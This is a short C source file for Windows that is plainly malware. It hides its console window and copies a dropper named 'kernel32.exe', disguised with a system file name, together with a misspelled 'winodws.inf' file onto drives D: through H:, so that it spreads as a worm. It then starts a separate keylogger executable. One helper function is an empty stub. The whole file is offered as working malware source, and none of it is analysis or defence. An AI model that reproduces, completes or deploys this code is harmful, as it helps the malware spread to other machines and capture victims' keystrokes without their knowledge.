#include <stdio.h>
#include <string.h>
#include <Windows.h>

#define DROP_FILE_NAME "kernel32.exe"
#define HIDE 0

void start_checked();
void xcp();

int main(int argc, char **argv) {
    // Hide
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, HIDE);
    if(fopen("D:\\" DROP_FILE_NAME, "r") == NULL) 
        // worm
        xcp();
    // Active the keylogger
    system("start key.exe");
    return 0;
}

void start_checked(char *P_name) {}

void xcp() {
    char shell[] = 
"xcopy /e /y winodws.inf D:\\\n\
xcopy /e /y winodws.inf E:\\\n\
xcopy /e /y winodws.inf F:\\\n\
xcopy /e /y winodws.inf G:\\\n\
xcopy /e /y winodws.inf H:\\\n";
    char shell2[] =
"xcopy /e /y "DROP_FILE_NAME" D:\\\n\
xcopy /e /y "DROP_FILE_NAME" E:\\\n\
xcopy /e /y "DROP_FILE_NAME" F:\\\n\
xcopy /e /y "DROP_FILE_NAME" G:\\\n\
xcopy /e /y "DROP_FILE_NAME" H:\\";
    system(shell);
    system(shell2);
    start_checked(DROP_FILE_NAME);
    return;
}
